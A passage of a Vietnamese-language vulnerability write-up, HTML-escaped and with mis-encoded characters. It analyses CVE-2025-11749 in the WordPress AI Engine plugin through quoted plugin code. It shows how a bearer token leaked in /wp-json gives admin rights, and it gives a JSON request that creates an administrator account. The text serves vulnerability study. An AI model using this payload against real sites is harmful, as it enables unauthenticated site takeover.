&lt;strong&gt;t·∫°o t√†i kho·∫£n qu·∫£n tr·ªã vi√™n m·ªõi&lt;/strong&gt;, d·∫´n ƒë·∫øn &lt;strong&gt;leo thang ƒë·∫∑c quy·ªÅn&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-11749&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-11749&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Privilege Escalation&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.1.3&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.1.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/ai-engine/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress AI Engine Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;AI Engine&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.1.3&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.1.4&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒë√£ ƒëƒÉng k√Ω API:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function rest_api_init() {&#xA;    // Load bearer token if not already loaded&#xA;    if ( $this-&amp;gt;bearer_token === null ) {&#xA;      $this-&amp;gt;bearer_token = $this-&amp;gt;core-&amp;gt;get_option( &amp;#39;mcp_bearer_token&amp;#39; );&#xA;    }&#xA;    ...&#xA;    // No-Auth URL endpoints (with token in path)&#xA;    $noauth_enabled = $this-&amp;gt;core-&amp;gt;get_option( &amp;#39;mcp_noauth_url&amp;#39; );&#xA;    if ( $noauth_enabled &amp;amp;&amp;amp; !empty( $this-&amp;gt;bearer_token ) ) {&#xA;        ...&#xA;        register_rest_route( $this-&amp;gt;namespace, &amp;#39;/&amp;#39; . $this-&amp;gt;bearer_token . &amp;#39;/messages&amp;#39;, [&#xA;            &amp;#39;methods&amp;#39; =&amp;gt; &amp;#39;POST&amp;#39;,&#xA;            &amp;#39;callback&amp;#39; =&amp;gt; [ $this, &amp;#39;handle_message&amp;#39; ],&#xA;            &amp;#39;permission_callback&amp;#39; =&amp;gt; function ( $request ) {&#xA;                return $this-&amp;gt;handle_noauth_access( $request );&#xA;            },&#xA;        ] );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒêi·ªÅu ki·ªán ƒë·ªÉ c√°c API n√†y ho·∫°t ƒë·ªông l√†:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Bearer Token&lt;/strong&gt; ph·∫£i ƒë∆∞·ª£c thi·∫øt l·∫≠p (ƒë√£ t·ªìn t·∫°i gi√° tr·ªã).&lt;/li&gt;&#xA;&lt;li&gt;T√πy ch·ªçn &lt;strong&gt;No-Auth URL&lt;/strong&gt; ph·∫£i ƒë∆∞·ª£c b·∫≠t.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Ta c√≥ th·ªÉ ho√†n th√†nh c√°c thi·∫øt l·∫≠p n√†y trong Admin Dashboard (Endpoint: &lt;code&gt;/wp-admin/admin.php?page=mwai_settings&amp;amp;nekoTab=settings&lt;/code&gt;) theo th·ª© t·ª± nh∆∞ sau:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/enable.png&#34; title=&#34;Setup Bearer Token v√† No-Auth URL&#34; data-thumbnail=&#34;/posts/2026-01-01-cve-2025-11749/enable.png&#34; data-sub-html=&#34;&lt;h2&gt;Enable&lt;/h2&gt;&lt;p&gt;Setup Bearer Token v√† No-Auth URL&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-01-cve-2025-11749/enable.png&#39; alt=&#34;Enable&#34; height=&#34;472&#34; width=&#34;868&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Setup Bearer Token v√† No-Auth URL&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ta ƒë·∫∑t &lt;strong&gt;Bearer Token&lt;/strong&gt; th√†nh 1 chu·ªói b·∫•t k√¨, v√≠ d·ª•: &lt;code&gt;aaaaaaaaaa&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Chu·ªói n√†y ƒë√≥ng vai tr√≤ nh∆∞ &lt;strong&gt;ch√¨a kh√≥a b√≠ m·∫≠t ƒë·ªÉ&lt;/strong&gt; truy c·∫≠p c√°c API n√†y.&#xA;Ch·ªâ nh·ªØng ai bi·∫øt gi√° tr·ªã n√†y m·ªõi c√≥ th·ªÉ g·ªçi ƒë∆∞·ª£c c√°c endpoint t∆∞∆°ng ·ª©ng.&lt;/p&gt;&#xA;&lt;p&gt;Tuy nhi√™n, theo m√¥ t·∫£ c·ªßa CVE th√¨ ƒë√¢y l√† 1 ph·∫ßn c·ªßa l·ªó h·ªïng, ngay c·∫£ ng∆∞·ªùi d√πng ch∆∞a ƒëƒÉng nh·∫≠p c≈©ng c√≥ bi·∫øt gi√° tr·ªã c·ªßa &lt;strong&gt;Bearer Token&lt;/strong&gt; =&amp;gt; kh√¥ng c√≤n l√† &lt;strong&gt;b√≠ m·∫≠t&lt;/strong&gt; n·ªØa.&lt;/p&gt;&#xA;&lt;p&gt;M·ªçi th·ª© ƒë∆∞·ª£c &lt;strong&gt;b·∫≠t m√≠&lt;/strong&gt; khi ta truy c·∫≠p &lt;code&gt;/wp-json&lt;/code&gt;, WordPress s·∫Ω tr·∫£ v·ªÅ &lt;strong&gt;REST API Index&lt;/strong&gt; ‚Äî t·ª©c l√† b·∫£n m√¥ t·∫£ to√†n b·ªô c√°c API m√† website ƒëang cung c·∫•p, bao g·ªìm c√°c API ch·ª©a &lt;strong&gt;Bearer Token&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/exposed.png&#34; title=&#34;Gi√° tr·ªã Bearer Token trong response&#34; data-thumbnail=&#34;/posts/2026-01-01-cve-2025-11749/exposed.png&#34; data-sub-html=&#34;&lt;h2&gt;Exposed&lt;/h2&gt;&lt;p&gt;Gi√° tr·ªã Bearer Token trong response&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-01-cve-2025-11749/exposed.png&#39; alt=&#34;Exposed&#34; height=&#34;877&#34; width=&#34;1570&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Gi√° tr·ªã Bearer Token trong response&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;T·∫•t c·∫£ ng∆∞·ªùi d√πng (k·ªÉ c·∫£ &lt;strong&gt;ch∆∞a ƒëƒÉng nh·∫≠p&lt;/strong&gt;) ƒë·ªÅu c√≥ th·ªÉ g·ªçi ƒë·∫øn &lt;code&gt;/wp-json&lt;/code&gt; n√†y.&lt;/p&gt;&#xA;&lt;p&gt;B·∫£n v√° &lt;strong&gt;v3.1.4&lt;/strong&gt; th√™m t√πy ch·ªçn &lt;code&gt;&#39;show_in_rest&#39; =&amp;gt; false&lt;/code&gt; khi ƒëƒÉng k√Ω API, nh·∫±m &lt;strong&gt;·∫©n c√°c endpoint kh·ªèi &lt;code&gt;/wp-json&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/patch.png&#34; title=&#34;B·∫£n v√°&#34; data-thumbnail=&#34;/posts/2026-01-01-cve-2025-11749/patch.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch&lt;/h2&gt;&lt;p&gt;B·∫£n v√°&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-01-cve-2025-11749/patch.png&#39; alt=&#34;Patch&#34; height=&#34;601&#34; width=&#34;1770&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;B·∫£n v√°&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;ƒêi·ªÅu n√†y gi√∫p:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Kh√¥ng hi·ªÉn th·ªã API trong danh s√°ch REST&lt;/li&gt;&#xA;&lt;li&gt;Gi·∫£m kh·∫£ nƒÉng b·ªã d√≤ qu√©t&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Tuy nhi√™n:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;API v·∫´n truy c·∫≠p ƒë∆∞·ª£c n·∫øu bi·∫øt URL&lt;/li&gt;&#xA;&lt;li&gt;Kh√¥ng thay th·∫ø cho c∆° ch·∫ø x√°c th·ª±c an to√†n&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;üëâ ƒê√¢y ch·ªâ l√† bi·ªán ph√°p che gi·∫•u, kh√¥ng ph·∫£i b·∫£o m·∫≠t th·ª±c s·ª±.&lt;/p&gt;&#xA;&lt;p&gt;API ƒë√£ ƒë∆∞·ª£c ƒëƒÉng k√Ω v·ªõi &lt;code&gt;permission_callback&lt;/code&gt; l√† &lt;code&gt;handle_noauth_access&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function handle_noauth_access( $request ) {&#xA;    // For no-auth URLs, the token is already verified by being in the URL path&#xA;    // Double-check that the route actually contains the token&#xA;    $route = $request-&amp;gt;get_route();&#xA;    if ( strpos( $route, &amp;#39;/&amp;#39; . $this-&amp;gt;bearer_token . &amp;#39;/&amp;#39; ) === false ) {&#xA;      if ( $this-&amp;gt;logging ) {&#xA;        error_log( &amp;#39;[AI Engine MCP] ‚ùå Invalid no-auth URL access attempt.&amp;#39; );&#xA;      }&#xA;      return false;&#xA;    }&#xA;&#xA;    // Set the current user to admin since token is valid&#xA;    if ( $admin = $this-&amp;gt;core-&amp;gt;get_admin_user() ) {&#xA;      wp_set_current_user( $admin-&amp;gt;ID, $admin-&amp;gt;user_login );&#xA;    }&#xA;    return true;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m th·ª±c hi·ªán ki·ªÉm tra &lt;strong&gt;Bearer Token&lt;/strong&gt; c√≥ h·ª£p l·ªá hay kh√¥ng. N·∫øu h·ª£p l·ªá, h√†m s·∫Ω:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;wp_set_current_user( $admin-&amp;gt;ID, $admin-&amp;gt;user_login );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;G√°n ng∆∞·ªùi d√πng hi·ªán t·∫°i th√†nh admin, cho ph√©p &lt;code&gt;&amp;quot;request hi·ªán t·∫°i&amp;quot;&lt;/code&gt; ti·∫øp t·ª•c th·ª±c thi v·ªõi to√†n quy·ªÅn qu·∫£n tr·ªã. Sau khi request k·∫øt th√∫c th√¨ quy·ªÅn admin c≈©ng h·∫øt.&lt;/p&gt;&#xA;&lt;p&gt;Khi ta truy c·∫≠p endpoint &lt;code&gt;/wp-json/mcp/v1/aaaaaaaaaa/messages&lt;/code&gt; th√¨ callback &lt;code&gt;handle_message&lt;/code&gt; s·∫Ω ƒë∆∞·ª£c g·ªçi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function handle_message( WP_REST_Request $request ) {&#xA;    ...&#xA;    $raw = $request-&amp;gt;get_body();&#xA;    $dat = json_decode( $raw, true );&#xA;    ...&#xA;    $id = $dat[&amp;#39;id&amp;#39;] ?? null;&#xA;    $method = $dat[&amp;#39;method&amp;#39;] ?? null;&#xA;    ...&#xA;    // It&amp;#39;s a notification, no ID = no reply&#xA;    if ( $id === null &amp;amp;&amp;amp; $method !== null ) {&#xA;      return new WP_REST_Response( null, 204 );&#xA;    }&#xA;    ...&#xA;    try {&#xA;&#xA;      $reply = null;&#xA;&#xA;      #region Methods switch&#xA;      switch ( $method ) {&#xA;        ...&#xA;        case &amp;#39;tools/call&amp;#39;:&#xA;          $params = $dat[&amp;#39;params&amp;#39;] ?? [];&#xA;          $tool = $params[&amp;#39;name&amp;#39;] ?? &amp;#39;&amp;#39;;&#xA;          $arguments = $params[&amp;#39;arguments&amp;#39;] ?? [];&#xA;&#xA;          if ( $this-&amp;gt;logging ) {&#xA;            error_log( &amp;#39;[AI Engine MCP SSE] üîß tools/call - Tool: &amp;#39; . $tool );&#xA;            error_log( &amp;#39;[AI Engine MCP SSE] üîß tools/call - Arguments: &amp;#39; . wp_json_encode( $arguments ) );&#xA;          }&#xA;&#xA;          try {&#xA;            $reply = $this-&amp;gt;execute_tool( $tool, $arguments, $id );&#xA;            if ( $this-&amp;gt;logging ) {&#xA;              error_log( &amp;#39;[AI Engine MCP SSE] ‚úÖ tools/call - Success for tool: &amp;#39; . $tool );&#xA;            }&#xA;          }&#xA;          catch ( Exception $e ) {&#xA;            if ( $this-&amp;gt;logging ) {&#xA;              error_log( &amp;#39;[AI Engine MCP SSE] ‚ùå tools/call - Error: &amp;#39; . $e-&amp;gt;getMessage() );&#xA;            }&#xA;            throw $e;&#xA;          }&#xA;          break;&#xA;        ...&#xA;      }&#xA;      #endregion&#xA;&#xA;      if ( $reply ) {&#xA;        // Don&amp;#39;t log response queuing - it&amp;#39;s too noisy&#xA;        $this-&amp;gt;store_message( $sess, $reply );&#xA;      }&#xA;&#xA;    }&#xA;    catch ( Exception $e ) {&#xA;      $this-&amp;gt;queue_error( $sess, $id, -32603, &amp;#39;Internal error&amp;#39;, $e-&amp;gt;getMessage() );&#xA;    }&#xA;&#xA;    return new WP_REST_Response( null, 204 );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m nh·∫≠n m·ªôt request JSON, ph√¢n t√≠ch n·ªôi dung, th·ª±c thi h√†nh ƒë·ªông t∆∞∆°ng ·ª©ng v√† tr·∫£ k·∫øt qu·∫£ (n·∫øu c·∫ßn).&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;N·∫øu l√† notification (kh√¥ng c√≥ &lt;code&gt;id&lt;/code&gt;) ‚Üí Kh√¥ng c·∫ßn ph·∫£n h·ªìi ‚Üí tr·∫£ HTTP 204&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ($id === null &amp;amp;&amp;amp; $method !== null)&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;X·ª≠ l√Ω theo method: N·∫øu l√† &lt;code&gt;tools/call&lt;/code&gt; th√¨ l·∫•y c√°c param c·∫ßn thi·∫øt v√† g·ªçi ƒë·∫øn &lt;code&gt;execute_tool( $tool, $arguments, $id );&lt;/code&gt; ƒë·ªÉ th·ª±c thi tool n·ªôi b·ªô.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Request body hi·ªán t·∫°i s·∫Ω nh∆∞ sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;id&amp;#34;: 1,&#xA;  &amp;#34;method&amp;#34;: &amp;#34;tools/call&amp;#34;,&#xA;  &amp;#34;params&amp;#34;: {&#xA;  },&#xA;  &amp;#34;name&amp;#34;: &amp;#34;2&amp;#34;,&#xA;  &amp;#34;arguments&amp;#34;: &amp;#34;3&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;private function execute_tool( $tool, $args, $id ) {&#xA;    try {&#xA;      ...&#xA;      $filtered = apply_filters( &amp;#39;mwai_mcp_callback&amp;#39;, null, $tool, $args, $id, $this );&#xA;      ...&#xA;    }&#xA;    catch ( Exception $e ) {&#xA;      return $this-&amp;gt;rpc_error( $id, -32603, $e-&amp;gt;getMessage() );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;execute_tool&lt;/code&gt; g·ªçi ƒë·∫øn c√°c callback ƒë√£ ƒëƒÉng k√Ω cho filter &lt;code&gt;mwai_mcp_callback&lt;/code&gt; c√πng 3 tham s·ªë ƒë√£ truy·ªÅn v√†o tr∆∞·ªõc ƒë√≥.&lt;/p&gt;&#xA;&lt;p&gt;Khi search v·ªõi t·ª´ kh√≥a &lt;code&gt;mwai_mcp_callback&lt;/code&gt; ta th·∫•y n√≥ ƒë∆∞·ª£c ƒëƒÉng k√Ω trong class &lt;code&gt;Meow_MWAI_Labs_MCP_Core&lt;/code&gt;, n∆°i ·∫£nh h∆∞·ªüng tr·ª±c ti·∫øp ƒë·∫øn l·ªó h·ªïng n√†y.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/filter.png&#34; title=&#34;Filter mwai_mcp_callback&#34; data-thumbnail=&#34;/posts/2026-01-01-cve-2025-11749/filter.png&#34; data-sub-html=&#34;&lt;h2&gt;Filter&lt;/h2&gt;&lt;p&gt;Filter mwai_mcp_callback&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-01-cve-2025-11749/filter.png&#39; alt=&#34;Filter&#34; height=&#34;422&#34; width=&#34;1740&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Filter mwai_mcp_callback&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;ƒêi·ªÅu ki·ªán ƒë·ªÉ filter n√†y ho·∫°t ƒë·ªông l√† class &lt;code&gt;Meow_MWAI_Labs_MCP_Core&lt;/code&gt; ph·∫£i ƒë∆∞·ª£c kh·ªüi t·∫°o ·ªü ƒë√¢u ƒë√≥.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/init.png&#34; title=&#34;Meow_MWAI_Labs_MCP_Core ƒë∆∞·ª£c kh·ªüi t·∫°o&#34; data-thumbnail=&#34;/posts/2026-01-01-cve-2025-11749/init.png&#34; data-sub-html=&#34;&lt;h2&gt;Init&lt;/h2&gt;&lt;p&gt;Meow_MWAI_Labs_MCP_Core ƒë∆∞·ª£c kh·ªüi t·∫°o&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-01-cve-2025-11749/init.png&#39; alt=&#34;Init&#34; height=&#34;669&#34; width=&#34;1133&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Meow_MWAI_Labs_MCP_Core ƒë∆∞·ª£c kh·ªüi t·∫°o&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;ƒêi·ªÅu n√†y ch·ªâ x·∫£y ra khi MCP Features WordPress ƒë∆∞·ª£c b·∫≠t. Ta c√≥ th·ªÉ ho√†n th√†nh c√°c thi·∫øt l·∫≠p n√†y trong Admin Dashboard (Endpoint: &lt;code&gt;/wp-admin/admin.php?page=mwai_settings&amp;amp;nekoTab=settings&lt;/code&gt;)&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/enable1.png&#34; title=&#34;B·∫≠t MCP Features WordPress&#34; data-thumbnail=&#34;/posts/2026-01-01-cve-2025-11749/enable1.png&#34; data-sub-html=&#34;&lt;h2&gt;Enable1&lt;/h2&gt;&lt;p&gt;B·∫≠t MCP Features WordPress&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-01-cve-2025-11749/enable1.png&#39; alt=&#34;Enable1&#34; height=&#34;353&#34; width=&#34;851&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;B·∫≠t MCP Features WordPress&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Khi filter ƒë∆∞·ª£c √°p d·ª•ng, callback &lt;code&gt;handle_call&lt;/code&gt; s·∫Ω ƒë∆∞·ª£c g·ªçi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function handle_call( $prev, string $tool, array $args, int $id ) {&#xA;    // Security check is already done in the MCP auth layer&#xA;    // If we reach here, the user is authorized to use MCP&#xA;    if ( !empty( $prev ) || !isset( $this-&amp;gt;tools()[ $tool ] ) ) {&#xA;      return $prev;&#xA;    }&#xA;    return $this-&amp;gt;dispatch( $tool, $args, $id );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;N·∫øu l√† tool h·ª£p l·ªá =&amp;gt; g·ªçi ƒë·∫øn &lt;code&gt;dispatch( $tool, $args, $id )&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Trong danh s√°ch tool h·ª£p l·ªá, g·ªìm c√≥ tool &lt;code&gt;wp_create_user&lt;/code&gt; d√πng ƒë·ªÉ t·∫°o user m·ªõi =&amp;gt; T·∫°o ƒë∆∞·ª£c ng∆∞·ªùi d√πng v·ªõi quy·ªÅn &lt;code&gt;administrator&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/valid_tool.png&#34; title=&#34;Tool wp_create_user&#34; data-thumbnail=&#34;/posts/2026-01-01-cve-2025-11749/valid_tool.png&#34; data-sub-html=&#34;&lt;h2&gt;Tool&lt;/h2&gt;&lt;p&gt;Tool wp_create_user&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-01-cve-2025-11749/valid_tool.png&#39; alt=&#34;Tool&#34; height=&#34;411&#34; width=&#34;1098&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Tool wp_create_user&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Tool n√†y y√™u c·∫ßu c√°c thu·ªôc t√≠nh: &lt;code&gt;user_login&lt;/code&gt;, &lt;code&gt;user_email&lt;/code&gt;, &lt;code&gt;user_pass&lt;/code&gt;, &lt;code&gt;display_name&lt;/code&gt;, &lt;code&gt;role&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Request body hi·ªán t·∫°i s·∫Ω nh∆∞ sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;id&amp;#34;: 1,&#xA;  &amp;#34;method&amp;#34;: &amp;#34;tools/call&amp;#34;,&#xA;  &amp;#34;params&amp;#34;: {&#xA;    &amp;#34;name&amp;#34;: &amp;#34;wp_create_user&amp;#34;,&#xA;    &amp;#34;arguments&amp;#34;: {&#xA;      &amp;#34;user_login&amp;#34;: &amp;#34;hacker&amp;#34;,&#xA;      &amp;#34;user_email&amp;#34;: &amp;#34;hacker@gmail.com&amp;#34;,&#xA;      &amp;#34;user_pass&amp;#34;: &amp;#34;hacker&amp;#34;,&#xA;      &amp;#34;display_name&amp;#34;: &amp;#34;hacker&amp;#34;,&#xA;      &amp;#34;role&amp;#34;: &amp;#34;administrator&amp;#34;&#xA;    }&#xA;  },&#xA;  &amp;#34;name&amp;#34;: &amp;#34;2&amp;#34;,&#xA;  &amp;#34;arguments&amp;#34;: &amp;#34;3&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ti·∫øp t·ª•c ph√¢n t√≠ch h√†m &lt;code&gt;dispatch&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;private function dispatch( string $tool, array $a, int $id ): array {&#xA;    $r = [ &amp;#39;jsonrpc&amp;#39; =&amp;gt; &amp;#39;2.0&amp;#39;, &amp;#39;id&amp;#39; =&amp;gt; $id ];&#xA;    switch ( $tool ) {&#xA;    ...&#xA;      case &amp;#39;wp_create_user&amp;#39;:&#xA;        $data = [&#xA;          &amp;#39;user_login&amp;#39; =&amp;gt; sanitize_user( $a[&amp;#39;user_login&amp;#39;] ),&#xA;          &amp;#39;user_email&amp;#39; 